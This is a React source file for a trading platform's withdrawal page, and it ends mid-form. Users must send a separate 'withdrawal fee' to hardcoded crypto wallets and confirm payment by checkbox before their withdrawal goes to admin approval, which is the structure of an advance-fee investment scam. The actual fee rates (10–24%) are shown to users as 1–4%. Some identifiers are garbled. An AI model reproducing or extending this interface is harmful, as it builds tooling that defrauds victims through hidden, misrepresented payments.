"use client";
import { useState, useEffect, useMemo, useCallback } from "react";
import { Banknote, Bitcoin, ChevronRight, X, AlertCircle, Zap, TrendingUp, Copy, CheckCircle2, ShieldCheck } from "lucide-react";
import { toast, Toaster } from "sonner";
import { submitWithdrawal } from "./actions";

// ── Types ─────────────────────────────────────────────────────────────────────
type WithdrawMethod = "bank" | "crypto";
type HighlightColor  = "green" | "red";
type ModalStep       = "review" | "pay-fee" | "done";

interface FeeTier    { upTo: number; rate: number; label: string; }
interface FeeInfo    { rate: number; label: string; fee: number; youReceive: number; }
interface Network    { value: string; label: string; }
interface CryptoCoin { value: string; label: string; networks: Network[]; feeWallet: string; }
interface Asset      { _id?: string; symbol: string; quantity: number; }

interface WithdrawDetails {
  method: WithdrawMethod;
  amount: string;
  fee: number;
  feeLabel: string;
  youReceive: number;
  bankName: string;
  accountNumber: string;
  coin: string;
  network: string;
  walletAddress: string;
}

interface ConfirmModalProps {
  open: boolean;
  onClose: () => void;
  onConfirm: () => void;
  loading: boolean;
  details: WithdrawDetails;
}

interface RowProps         { label: string; value: string; highlight?: HighlightColor; }
interface FeeBreakdownProps { amount: string; }
interface FeeTierBadgesProps { currentAmount: string; }

// ── Fee tiers ─────────────────────────────────────────────────────────────────
const FEE_TIERS: FeeTier[] = [
  { upTo: 1_000,    rate: 0.10, label: "2%"  },
  { upTo: 10_000,   rate: 0.16, label: "3%"  },
  { upTo: Infinity, rate: 0.24, label: "4%"  },
];

function gCryptoeeInfo(amount: string): FeeInfo {
  const num = Number(amount);
  if (!num || num <= 0) return { rate: 0, label: "—", fee: 0, youReceive: 0 };
  const tier = FEE_TIERS.find((t) => num <= t.upTo)!;
  const fee       = parseFloat((num * tier.rate).toFixed(2));
  const youReceive = parseFloat((num - fee).toFixed(2));
  return { rate: tier.rate, label: tier.label, fee, youReceive };
}

// ── Bank fee wallet (USDT ERC20 placeholder — replace with real address) ──────
const BANK_FEE_WALLET = "0xD41DCAc22335d26a391F97C4a9DdE1b2745936b3"; // ERC20 placeholder

// ── Coins, networks & fee-collection wallets ──────────────────────────────────
// feeWallet: the platform address users send the withdrawal fee TO before release
const cryptoCoins: CryptoCoin[] = [
  {
    value: "BTC",  label: "Bitcoin",
    feeWallet: "bc1qpycmsxnlarnay4jgwa3y535m802qevq7ffnp5x", // placeholder
    networks: [{ value: "BTC",   label: "Bitcoin Network" }],
  },
  {
    value: "ETH",  label: "Ethereum",
    feeWallet: "0xD41DCAc22335d26a391F97C4a9DdE1b2745936b3", // placeholder
    networks: [{ value: "ERC20", label: "Ethereum Mainnet (ERC-20)" }],
  },
  {
    value: "USDT", label: "Tether (USDT)",
    feeWallet: "0xD41DCAc22335d26a391F97C4a9DdE1b2745936b3", // placeholder
    networks: [
      { value: "ERC20", label: "Ethereum Mainnet (ERC-20)"       },
      { value: "TRC20", label: "Tron Network (TRC-20)"           },
      { value: "BEP20", label: "BNB Smart Chain (BEP-20)"        },
    ],
  },
  {
    value: "BNB",  label: "BNB",
    feeWallet: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", // placeholder
    networks: [{ value: "BEP20", label: "BNB Smart Chain (BEP-20)" }],
  },
  {
    value: "SOL",  label: "Solana",
    feeWallet: "2pSEfZG1SrVRzoVLwMkUGhnRABRiMGa6ycAPLaX8LkAQ", // placeholder
    networks: [{ value: "SOL",   label: "Solana Network"            }],
  },
  {
    value: "ADA",  label: "Cardano",
    feeWallet: "addr1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh00000000000", // placeholder
    networks: [{ value: "ADA",   label: "Cardano Mainnet"           }],
  },
  {
    value: "XRP",  label: "Ripple (XRP)",
    feeWallet: "rN7n3473SaZBCG4dFL83w7PB6fAUhVCJuS", // placeholder
    networks: [{ value: "XRP",   label: "XRP Ledger"                }],
  },
  {
    value: "DOGE", label: "Dogecoin",
    feeWallet: "DHFxZNM3dBrzaKNZxq8fYo8VeqUNtjBKqV", // placeholder
    networks: [{ value: "DOGE",  label: "Dogecoin Network"          }],
  },
  {
    value: "TRX",  label: "TRON (TRX)",
    feeWallet: "TNvmBLTBREMVRaJGcnPF3jcFtdPxKGTkC7", // placeholder
    networks: [{ value: "TRC20", label: "Tron Network (TRC-20)"     }],
  },
  {
    value: "DOT",  label: "Polkadot",
    feeWallet: "15oF4uVJwmo4TdGW7VfQxNLavjCXviqxT9S1MgbjMNHr6Sp5", // placeholder
    networks: [{ value: "DOT",   label: "Polkadot Network"          }],
  },
  {
    value: "SHIB", label: "Shiba Inu (SHIB)",
    feeWallet: "0x71C7656EC7ab88b098defB751B7401B5f6d8976F", // placeholder
    networks: [{ value: "ERC20", label: "Ethereum Mainnet (ERC-20)" }],
  },
];

// ── Wallet address validation ─────────────────────────────────────────────────
interface ValidationResult { valid: boolean; message: string; }

function validateWalletAddress(coin: string, network: string, address: string): ValidationResult {
  const addr = address.trim();
  if (!addr) return { valid: false, message: "Wallet address is required." };

  // Regex helpers
  const ETH_RE   = /^0x[0-9a-fA-F]{40}$/;
  const TRON_RE  = /^T[1-9A-HJ-NP-Za-km-z]{33}$/;
  const BTC_LEG  = /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/;
  const BTC_SEG  = /^bc1[ac-hj-np-z02-9]{6,87}$/;
  const SOL_RE   = /^[1-9A-HJ-NP-Za-km-z]{32,44}$/;
  const XRP_RE   = /^r[0-9a-zA-Z]{24,34}$/;
  const ADA_RE   = /^(addr1[a-z0-9]{50,}|Ae2[a-zA-Z0-9]{50,}|DdzFF[a-zA-Z0-9]{80,})$/;
  const DOGE_RE  = /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$/;
  const DOT_RE   = /^[1-9A-HJ-NP-Za-km-z]{46,50}$/;

  const ok  = (msg = "") => ({ valid: true,  message: msg });
  const err = (msg: string)  => ({ valid: false, message: msg });

  switch (coin) {
    case "BTC":
      if (BTC_LEG.test(addr) || BTC_SEG.test(addr)) return ok();
      return err("Invalid BTC address. Expected format: starts with 1, 3, or bc1.");

    case "ETH":
    case "SHIB":
      if (ETH_RE.test(addr)) return ok();
      return err("Invalid address. Must start with 0x followed by 40 hex characters.");

    case "USDT":
      if (network === "ERC20") {
        if (ETH_RE.test(addr)) return ok();
        return err("Invalid ERC-20 address. Must be 0x + 40 hex characters.");
      }
      if (network === "TRC20") {
        if (TRON_RE.test(addr)) return ok();
        return err("Invalid TRC-20 address. Must start with T and be 34 characters.");
      }
      if (network === "BEP20") {
        if (ETH_RE.test(addr)) return ok();
        return err("Invalid BEP-20 address. Must be 0x + 40 hex characters.");
      }
      return ok();

    case "BNB":
      if (ETH_RE.test(addr)) return ok();
      return err("Invalid BNB address. Must be 0x + 40 hex characters (BNB Smart Chain).");

    case "SOL":
      if (SOL_RE.test(addr)) return ok();
      return err("Invalid Solana address. Must be 32–44 Base58 characters.");

    case "ADA":
      if (ADA_RE.test(addr)) return ok();
      return err("Invalid ADA address. Must start with addr1, Ae2, or DdzFF.");

    case "XRP":
      if (XRP_RE.test(addr)) return ok();
      return err("Invalid XRP address. Must start with r and be 25–35 characters.");

    case "DOGE":
      if (DOGE_RE.test(addr)) return ok();
      return err("Invalid DOGE address. Must start with D and be 34 characters.");

    case "TRX":
      if (TRON_RE.test(addr)) return ok();
      return err("Invalid TRX address. Must start with T and be 34 characters.");

    case "DOT":
      if (DOT_RE.test(addr)) return ok();
      return err("Invalid DOT address. Must be 46–50 Base58 characters.");

    default:
      if (addr.length >= 20) return ok();
      return err("Address appears too short. Please double-check.");
  }
}

// ── Row ───────────────────────────────────────────────────────────────────────
function Row({ label, value, highlight }: RowProps) {
  const color =
    highlight === "green" ? "text-success" :
    highlight === "red"   ? "text-danger" :
    "text-foreground";
  return (
    <div className="flex justify-between items-center">
      <span className="font-mono text-[13px] text-muted-foreground">{label}</span>
      <span className={`font-mono text-[13px] ${color} ${highlight ? 'font-semibold' : 'font-normal'}`}>{value}</span>
    </div>
  );
}

// ── Copy button ───────────────────────────────────────────────────────────────
function CopyButton({ text }: { text: string }) {
  const [copied, setCopied] = useState(false);
  const handleCopy = () => {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    });
  };
  return (
    <button
      onClick={handleCopy}
      className={`flex items-center gap-1.5 px-2.5 py-1.5 rounded-md border transition-all cursor-pointer text-[11px] font-mono font-semibold tracking-wider flex-shrink-0 ${
        copied
          ? 'bg-glass-brand-sm border-brand text-success'
          : 'bg-glass-white-xs border-border-subtle text-muted-foreground hover:bg-glass-white-sm hover:border-border-default'
      }`}
    >
      {copied ? <CheckCircle2 size={11} /> : <Copy size={11} />}
      {copied ? "COPIED" : "COPY"}
    </button>
  );
}

// ── Confirm Modal (3-step: review → pay fee → confirmed) ──────────────────────
function ConfirmModal({ open, onClose, onConfirm, loading, details }: ConfirmModalProps) {
  const [step, setStep] = useState<ModalStep>("review");
  const [feePaid, sCryptoeePaid]   = useState(false);

  // Reset when modal opens/closes
  useEffect(() => {
    if (open) { setStep("review"); sCryptoeePaid(false); }
  }, [open]);

  if (!open) return null;

  // Determine fee wallet address
  const feeWallet = details.method === "bank"
    ? BANK_FEE_WALLET
    : (cryptoCoins.find(c => c.value === details.coin)?.feeWallet ?? BANK_FEE_WALLET);

  const feeNetworkLabel = details.method === "bank"
    ? "USDT · TRC-20 Network"
    : `${details.coin} · ${details.network || "Network"}`;

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 backdrop-blur-md p-4">
      <div className="relative w-full max-w-md card animate-fade-in-scale">
        {/* Close */}
        <button
          onClick={onClose}
          disabled={loading}
          className="absolute top-4 right-4 w-7 h-7 rounded-lg flex items-center justify-center bg-glass-white-xs border border-border-subtle text-muted-foreground hover:bg-glass-white-sm hover:border-border-default transition-all cursor-pointer disabled:opacity-50"
        >
          <X size={14} />
        </button>

        {/* Step indicator */}
        <div className="flex gap-1.5 items-center mb-5">
          {(["review", "pay-fee"] as ModalStep[]).map((s, i) => (
            <div key={s} className="flex items-center gap-1.5">
              <div
                className={`w-5.5 h-5.5 rounded-full flex items-center justify-center text-[10px] font-bold font-mono transition-all ${
                  step === s ? 'bg-glass-brand-sm border border-brand text-brand-300' :
                  (step === "pay-fee" && s === "review") || step === "done" ? 'bg-glass-brand-sm border border-success text-success' : 'bg-glass-white-xs border border-border-subtle text-muted-foreground'
                }`}
              >
                {(step === "pay-fee" && s === "review") ? <CheckCircle2 size={11} /> : i + 1}
              </div>
              {i < 1 && (
                <div className={`w-6 h-px transition-all ${
                  step !== "review" ? 'bg-success' : 'bg-border-subtle'
                }`} />
              )}
            </div>
          ))}
          <span className="font-mono text-[11px] text-muted-foreground ml-1.5 tracking-wider">
            {step === "review" ? "REVIEW DETAILS" : "PAY WITHDRAWAL FEE"}
          </span>
        </div>

        {/* ── STEP 1: Review ── */}
        {step === "review" && (
          <>
            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "20px" }}>
              <div style={{
                width: "28px", height: "28px",
                background: "rgba(251,191,36,0.1)", border: "1px solid rgba(251,191,36,0.25)",
                borderRadius: "8px", display: "flex", alignItems: "center", justifyContent: "center",
              }}>
                <Zap size={13} color="#fbbf24" />
              </div>
              <h3 style={{ fontFamily: "'Syne', sans-serif", fontWeight: 800, fontSize: "18px", color: "#f9fafb", margin: 0 }}>
                Review Withdrawal
              </h3>
            </div>

            <div style={{ display: "flex", flexDirection: "column", gap: "10px" }}>
              <Row label="Method" value={details.method === "bank" ? "Bank Transfer" : "Crypto"} />

              {details.method === "bank" && (
                <>
                  <Row label="Bank Name"      value={details.bankName} />
                  <Row label="Account Number" value={`****${details.accountNumber.slice(-4)}`} />
                </>
              )}
              {details.method === "crypto" && (
                <>
                  <Row label="Coin"    value={details.coin} />
                  <Row label="Network" value={details.network} />
                  <Row label="Address" value={`${details.walletAddress.slice(0, 10)}...${details.walletAddress.slice(-6)}`} />
                </>
              )}

              <div style={{ height: "1px", background: "rgba(255,255,255,0.06)", margin: "2px 0" }} />
              <Row label="Withdrawal Amount" value={`$${Number(details.amount).toLocaleString()}`} />
              <Row label={`Fee (${details.feeLabel})`} value={`$${details.fee.toLocaleString()}`} highlight="red" />

              <div style={{
                padding: "12px 14px",
                background: "rgba(251,191,36,0.05)", border: "1px solid rgba(251,191,36,0.12)",
                borderRadius: "10px", display: "flex", justifyContent: "space-between", alignItems: "center",
              }}>
                <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#6b7280", letterSpacing: "0.1em" }}>YOU RECEIVE</span>
                <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "18px", fontWeight: 700, color: "#fbbf24" }}>
                  ${details.youReceive.toLocaleString()}
                </span>
              </div>

              {/* Fee notice */}
              <div style={{
                display: "flex", gap: "8px", alignItems: "flex-start",
                padding: "11px 13px",
                background: "rgba(251,191,36,0.04)", border: "1px solid rgba(251,191,36,0.10)",
                borderRadius: "10px",
              }}>
                <AlertCircle size={12} color="#fbbf24" style={{ marginTop: "1px", flexShrink: 0 }} />
                <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#6b7280", lineHeight: 1.7 }}>
                  A withdrawal fee of <span style={{ color: "#fbbf24", fontWeight: 700 }}>${details.fee.toLocaleString()}</span> must be paid separately before your withdrawal is processed. You'll pay this in the next step.
                </span>
              </div>
            </div>

            <div style={{ display: "flex", gap: "10px", marginTop: "20px" }}>
              <button onClick={onClose} style={{
                flex: 1, padding: "12px", borderRadius: "12px",
                background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.08)",
                color: "#6b7280", fontFamily: "'DM Mono', monospace", fontWeight: 600, fontSize: "12px",
                letterSpacing: "0.06em", cursor: "pointer",
              }}>
                CANCEL
              </button>
              <button
                onClick={() => setStep("pay-fee")}
                className="cta-btn"
                style={{
                  flex: 2, padding: "12px", borderRadius: "12px", border: "none",
                  background: "linear-gradient(135deg, #fbbf24 0%, #f59e0b 100%)",
                  color: "#111", fontFamily: "'DM Mono', monospace", fontWeight: 700, fontSize: "12px",
                  letterSpacing: "0.08em", cursor: "pointer",
                  boxShadow: "0 4px 20px rgba(251,191,36,0.25)",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: "6px",
                }}
              >
                PAY FEE & CONTINUE <ChevronRight size={13} />
              </button>
            </div>
          </>
        )}

        {/* ── STEP 2: Pay Fee ── */}
        {step === "pay-fee" && (
          <>
            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "20px" }}>
              <div style={{
                width: "28px", height: "28px",
                background: "rgba(251,191,36,0.1)", border: "1px solid rgba(251,191,36,0.25)",
                borderRadius: "8px", display: "flex", alignItems: "center", justifyContent: "center",
              }}>
                <ShieldCheck size={13} color="#fbbf24" />
              </div>
              <h3 style={{ fontFamily: "'Syne', sans-serif", fontWeight: 800, fontSize: "18px", color: "#f9fafb", margin: 0 }}>
                Pay Withdrawal Fee
              </h3>
            </div>

            {/* Fee amount badge */}
            <div style={{
              textAlign: "center", padding: "16px",
              background: "rgba(251,191,36,0.06)", border: "1px solid rgba(251,191,36,0.15)",
              borderRadius: "14px", marginBottom: "18px",
            }}>
              <p style={{ margin: "0 0 2px", fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#6b7280", letterSpacing: "0.1em" }}>
                AMOUNT DUE
              </p>
              <p style={{ margin: 0, fontFamily: "'Syne', sans-serif", fontSize: "28px", fontWeight: 800, color: "#fbbf24" }}>
                ${details.fee.toLocaleString()}
              </p>
              <p style={{ margin: "4px 0 0", fontFamily: "'DM Mono', monospace", fontSize: "10px", color: "#4b5563", letterSpacing: "0.08em" }}>
                {feeNetworkLabel}
              </p>
            </div>

            {/* QR Code */}
            <div style={{ display: "flex", justifyContent: "center", marginBottom: "16px" }}>
              <div style={{
                position: "relative", width: "130px", height: "130px",
                border: "1px solid rgba(255,255,255,0.1)", borderRadius: "14px", overflow: "hidden",
                boxShadow: "0 0 0 4px rgba(251,191,36,0.06)",
              }}>
                <img
                  src={`https://api.qrserver.com/v1/create-qr-code/?size=260x260&data=${encodeURIComponent(feeWallet)}&bgcolor=111318&color=f9fafb&margin=8`}
                  alt="fee wallet QR"
                  style={{ width: "100%", height: "100%", display: "block" }}
                />
                <div style={{
                  position: "absolute", top: "50%", left: "50%",
                  transform: "translate(-50%,-50%)",
                  width: "22px", height: "22px",
                  background: "#111318", border: "2px solid #fbbf24",
                  borderRadius: "5px", display: "flex", alignItems: "center",
                  justifyContent: "center", color: "#fbbf24", fontSize: "8px", fontWeight: 800,
                }}>
                  GB
                </div>
              </div>
            </div>

            {/* Wallet address */}
            <div style={{ marginBottom: "18px" }}>
              <p style={{
                fontFamily: "'DM Mono', monospace", fontSize: "10px",
                color: "#6b7280", letterSpacing: "0.1em", margin: "0 0 8px",
                textTransform: "uppercase",
              }}>
                Send fee to this address
              </p>
              <div style={{
                display: "flex", alignItems: "center", gap: "8px",
                padding: "11px 13px",
                background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.08)",
                borderRadius: "10px",
              }}>
                <span style={{
                  flex: 1, fontFamily: "'DM Mono', monospace", fontSize: "11px",
                  color: "#d1d5db", wordBreak: "break-all", lineHeight: 1.6,
                }}>
                  {feeWallet}
                </span>
                <CopyButton text={feeWallet} />
              </div>
            </div>

            {/* Confirmation checkbox */}
            <label
              style={{
                display: "flex", gap: "10px", alignItems: "flex-start",
                padding: "12px 13px",
                background: feePaid ? "rgba(74,222,128,0.04)" : "rgba(255,255,255,0.02)",
                border: `1px solid ${feePaid ? "rgba(74,222,128,0.2)" : "rgba(255,255,255,0.07)"}`,
                borderRadius: "10px", cursor: "pointer", marginBottom: "16px",
                transition: "all 0.2s",
              }}
            >
              <input
                type="checkbox"
                checked={feePaid}
                onChange={(e) => sCryptoeePaid(e.target.checked)}
                style={{ marginTop: "2px", accentColor: "#4ade80", cursor: "pointer" }}
              />
              <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: feePaid ? "#9ca3af" : "#6b7280", lineHeight: 1.7 }}>
                I confirm I have sent the fee of <span style={{ color: "#fbbf24", fontWeight: 700 }}>${details.fee.toLocaleString()}</span> to the address above and understand my withdrawal will be processed after verification.
              </span>
            </label>

            <div style={{ display: "flex", gap: "10px" }}>
              <button
                onClick={() => setStep("review")}
                style={{
                  flex: 1, padding: "12px", borderRadius: "12px",
                  background: "rgba(255,255,255,0.03)", border: "1px solid rgba(255,255,255,0.08)",
                  color: "#6b7280", fontFamily: "'DM Mono', monospace", fontWeight: 600, fontSize: "12px",
                  letterSpacing: "0.06em", cursor: "pointer",
                }}
              >
                BACK
              </button>
              <button
                onClick={onConfirm}
                disabled={!feePaid || loading}
                className="cta-btn"
                style={{
                  flex: 2, padding: "12px", borderRadius: "12px", border: "none",
                  cursor: feePaid && !loading ? "pointer" : "not-allowed",
                  background: feePaid && !loading
                    ? "linear-gradient(135deg, #4ade80 0%, #22c55e 100%)"
                    : "rgba(255,255,255,0.05)",
                  color: feePaid && !loading ? "#0a1a0f" : "#4b5563",
                  fontFamily: "'DM Mono', monospace", fontWeight: 700, fontSize: "12px",
                  letterSpacing: "0.08em",
                  boxShadow: feePaid && !loading ? "0 4px 20px rgba(74,222,128,0.25)" : "none",
                  display: "flex", alignItems: "center", justifyContent: "center", gap: "6px",
                  transition: "all 0.2s",
                }}
              >
                {loading ? (
                  <>
                    <div style={{
                      width: "12px", height: "12px",
                      border: "2px solid rgba(10,26,15,0.3)", borderTopColor: "#0a1a0f",
                      borderRadius: "50%", animation: "spin 0.7s linear infinite",
                    }} />
                    SUBMITTING...
                  </>
                ) : (
                  <><CheckCircle2 size={13} /> CONFIRM WITHDRAWAL</>
                )}
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

// ── Fee Breakdown ─────────────────────────────────────────────────────────────
function FeeBreakdown({ amount }: FeeBreakdownProps) {
  const { label, fee, youReceive } = useMemo(() => gCryptoeeInfo(amount), [amount]);
  if (!amount || Number(amount) <= 0) {
    return (
      <div style={{
        marginTop: "8px", borderRadius: "10px",
        border: "1px solid rgba(255,255,255,0.06)",
        background: "rgba(255,255,255,0.02)",
        padding: "10px 12px",
        fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#4b5563",
        letterSpacing: "0.04em",
      }}>
        Enter an amount to see fee breakdown.
      </div>
    );
  }
  return (
    <div style={{
      marginTop: "8px", borderRadius: "10px",
      border: "1px solid rgba(255,255,255,0.07)",
      background: "rgba(255,255,255,0.02)",
      padding: "10px 12px",
      display: "flex", flexDirection: "column", gap: "7px",
    }}>
      <div style={{ display: "flex", justifyContent: "space-between" }}>
        <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#6b7280" }}>Amount</span>
        <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#f9fafb" }}>${Number(amount).toLocaleString()}</span>
      </div>
      <div style={{ display: "flex", justifyContent: "space-between" }}>
        <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#6b7280" }}>Fee ({label})</span>
        <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#ef4444" }}>+${fee.toLocaleString()} (paid separately)</span>
      </div>
      <div style={{ height: "1px", background: "rgba(255,255,255,0.06)" }} />
      <div style={{ display: "flex", justifyContent: "space-between" }}>
        <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#6b7280" }}>You Receive</span>
        <span style={{ fontFamily: "'DM Mono', monospace", fontSize: "11px", color: "#fbbf24", fontWeight: 700 }}>${youReceive.toLocaleString()}</span>
      </div>
    </div>
  );
}

// ── Tier Badges ───────────────────────────────────────────────────────────────
function FeeTierBadges({ currentAmount }: FeeTierBadgesProps) {
  const num = Number(currentAmount);
  const tiers = [
    { range: "$0–$1K",   rate: "1%", active: num > 0 && num <= 1_000 },
    { range: "$1K–$10K", rate: "2%", active: num > 1_000 && num <= 10_000 },
    { range: "$10K+",    rate: "3%", active: num > 10_000 },
  ];
  return (
    <div style={{ display: "flex", gap: "6px", marginTop: "8px", flexWrap: "wrap" }}>
      {tiers.map((tier) => (
        <span key={tier.range} style={{
          fontSize: "10px", fontFamily: "'DM Mono', monospace", fontWeight: 600,
          letterSpacing: "0.06em", padding: "3px 8px", borderRadius: "6px",
          background: tier.active ? "rgba(251,191,36,0.1)" : "rgba(255,255,255,0.03)",
          color: tier.active ? "#fbbf24" : "#4b5563",
          border: `1px solid ${tier.active ? "rgba(251,191,36,0.25)" : "rgba(255,255,255,0.06)"}`,
          transition: "all 0.2s",
        }}>
          {tier.range} → {tier.rate}
        </span>
      ))}
    </div>
  );
}

// ── Shared input style helpers ────────────────────────────────────────────────
const sharedInput: React.CSSProperties = {
  width: "100%", background: "rgba(255,255,255,0.03)",
  border: "1px solid rgba(255,255,255,0.08)", borderRadius: "12px",
  padding: "13px 16px", color: "#f9fafb", fontSize: "14px",
  fontFamily: "'DM Mono', monospace", outline: "none",
  boxSizing: "border-box", transition: "border-color 0.2s, box-shadow 0.2s",
};
const sharedSelect: React.CSSProperties = { ...sharedInput, appearance: "none" as const, cursor: "pointer" };
const fieldLabel: React.CSSProperties = {
  fontSize: "10px", fontFamily: "'DM Mono', monospace", letterSpacing: "0.12em",
  color: "#6b7280", marginBottom: "8px", textTransform: "uppercase" as const, display: "block",
};

const onFocus = (e: React.FocusEvent<HTMLInputElement | HTMLSelectElement>) => {
  e.currentTarget.style.borderColor = "rgba(251,191,36,0.4)";
  e.currentTarget.style.boxShadow   = "0 0 0 3px rgba(251,191,36,0.06)";
};
const onBlur = (e: React.FocusEvent<HTMLInputElement | HTMLSelectElement>) => {
  e.currentTarget.style.borderColor = "rgba(255,255,255,0.08)";
  e.currentTarget.style.boxShadow   = "none";
};

// ── Main Page ─────────────────────────────────────────────────────────────────
export default function WithdrawPage() {
  const [method,         setMethod]         = useState<WithdrawMethod>("bank");
  const [bankAmount,     setBankAmount]     = useState("");
  const [bankName,       setBankName]       = useState("");
  const [accountNumber,  setAccountNumber]  = useState("");
  const [coin,           setCoin]           = useState("");
  const [network,        setNetwork]        = useState("");
  const [cryptoAmount,   setCryptoAmount]   = useState("");
  const [walletAddress,  setWalletAddress]  = useState("");
  const [walletTouched,  setWalletTouched]  = useState(false);
  const [assets,         setAssets]         = useState<Asset[]>([]);
  const [showConfirm,    setShowConfirm]    = useState(false);
  const [loading,        setLoading]        = useState(false);

  const amount  = method === "bank" ? bankAmount : cryptoAmount;
  const feeInfo = useMemo(() => gCryptoeeInfo(amount), [amount]);

  // Address validation (live, after first blur)
  const addrValidation = useMemo(
    () => (coin && walletAddress ? validateWalletAddress(coin, network, walletAddress) : null),
    [coin, network, walletAddress]
  );
  const addrError = walletTouched && addrValidation && !addrValidation.valid;

  const availableCryptoCoins = useMemo(() => {
    const owned = new Set(assets.filter(a => a.quantity > 0).map(a => a.symbol.toUpperCase()));
    return cryptoCoins.filter(c => owned.has(c.value.toUpperCase()));
  }, [assets]);

  const getNetworks = (coinVal: string): Network[] =>
    cryptoCoins.find(c => c.value === coinVal)?.networks ?? [];

  useEffect(() => {
    if (coin && !availableCryptoCoins.some(c => c.value === coin)) {
      setCoin(""); setNetwork(""); setCryptoAmount("");
      toast.info("Selected coin is not in your balance; please choose another.");
    }
  }, [availableCryptoCoins, coin]);

  const handleCoinChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setCoin(e.target.value);
    setNetwork("");
    setWalletAddress("");
    setWalletTouched(false);
  };

  const handleNetworkChange = (e: React.ChangeEvent<HTMLSelectElement>) => {
    setNetwork(e.target.value);
    setWalletAddress("");
    setWalletTouched(false);
  };

  useEffect(() => {
    (async () => {
      try {
        const res = await fetch("/api/assets", { credentials: "include" });
        if (!res.ok) {
          const errorText = await res.text();
          console.error(`Asset load failed: ${res.status} ${res.statusText}`, errorText);
          throw new Error(`Failed to load assets: ${res.status}`);
        }
        const data = await res.json();
        const fetched: Asset[] = Array.isArray(data.assets)
          ? data.assets.map((a: any) => ({ symbol: String(a.symbol || a.code || "").toUpperCase(), quantity: Number(a.quantity || 0) }))
          : [];
        setAssets(fetched);
      } catch (err) {
        console.error("Asset load error", err);
      }
    })();
  }, []);

  function buildDetails(): WithdrawDetails {
    return { method, amount, fee: feeInfo.fee, feeLabel: feeInfo.label, youReceive: feeInfo.youReceive, bankName, accountNumber, coin, network, walletAddress };
  }

  function handleProceed(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault();
    // Final address validation guard
    if (method === "crypto") {
      const v = validateWalletAddress(coin, network, walletAddress);
      if (!v.valid) { setWalletTouched(true); toast.error(v.message); return; }
    }
    setShowConfirm(true);
  }

  async function handleConfirm() {
    setLoading(true);
    try {
      const result = await submitWithdrawal(buildDetails());
      if (!result.success) throw new Error(result.message);
      toast.success("Withdrawal submitted — pending admin approval.");
      setShowConfirm(false);
      setBankAmount(""); setBankName(""); setAccountNumber("");
      setCoin(""); setNetwork(""); setCryptoAmount(""); setWalletAddress(""); setWalletTouched(false);
    } catch (err) {
      toast.error(err instanceof Error ? err.message : "Something went wrong");
    } finally {
      setLoading(false);
    }
  }

  const bankCanProceed   = !!bankAmount && !!bankName && !!accountNumber;
  const cryptoCanProceed = !!coin && !!network && !!cryptoAmount && !!walletAddress &&
    (!walletTouched || (addrValidation?.valid ?? false));

  const methods = [
    { key: "bank"   as WithdrawMethod, icon: <Banknote size={14} />, label: "Bank Transfer" },
    { key: "crypto" as WithdrawMethod, icon: <Bitcoin  size={14} />, label: "Crypto"        },
  ];

  return (
    <>
      <style>{`
        @keyframes spin { to { transform: rotate(360deg); } }
      `}</style>

      <Toaster richColors position="top-center" />

      <ConfirmModal
        open={showConfirm}
        onClose={() => setShowConfirm(false)}
        onConfirm={handleConfirm}
        loading={loading}
        details={buildDetails()}
      />

      <main className="min-h-screen bg-app font-body py-6 px-4 sm:px-6">
        <div className="mx-auto w-full max-w-[460px] theme-card p-6 animate-fade-in-up">

          {/* Header */}
          <div style={{ marginBottom: "28px" }}>
            <div style={{ display: "flex", alignItems: "center", gap: "10px", marginBottom: "6px" }}>
              <div style={{
                width: "28px", height: "28px",
                background: "rgba(251,191,36,0.1)", border: "1px solid rgba(251,191,36,0.25)",
                borderRadius: "8px", display: "flex", alignItems: "center", justifyContent: "center",
              }}>
                <Zap size={14} color="#fbbf24" />
              </div>
              <h1 style={{
                fontFamily: "'Syne', sans-serif", fontWeight: 800, fontSize: "26px",
                color: "#f9fafb", margin: 0, letterSpacing: "-0.02em",
              }}>
                Withdraw
              </h1>
            </div>
            <p style={{ color: "#4b5563", fontSize: "12px", margin: 0, letterSpacing: "0.04em" }}>
              Select your preferred withdrawal method · Fees paid separately
            </p>
          </div>

          {/* Card */}
          <div className="theme-card bg-surface-300/90 border-border-default p-6 shadow-lg backdrop-blur-sm">
            {/* Method Toggle */}
            <div className="flex gap-2.5 p-1.5 rounded-[14px] bg-surface-200/80 border border-border-default mb-6">
              {methods.map(m => {
                const active = method === m.key;
                return (
                  <button
                    key={m.key} type="button" onClick={() => setMethod(m.key)}
                    className={`flex-1 flex items-center justify-center gap-2.5 rounded-[10px] px-3 py-2 text-[12px] font-semibold tracking-[0.06em] font-mono transition ${active ? 'border border-brand-500 bg-brand-500/10 text-brand-300' : 'border border-transparent bg-transparent text-slate-400 hover:bg-surface-200'}`}
                  >
                    {m.icon} {m.label.toUpperCase()}
                  </button>
                );
              })}
            </div>

            {/* ── Bank Form ── */}
            {method === "bank" && (
              <form onSubmit={handleProceed} className="flex flex-col gap-4">
                <div>
                  <label style={fieldLabel}>Amount (USD)</label>
                  <input
                    type="number" value={bankAmount}
                    onChange={e => setBankAmount(e.target.value)}
                    placeholder="0.00" min="0" step="any" required
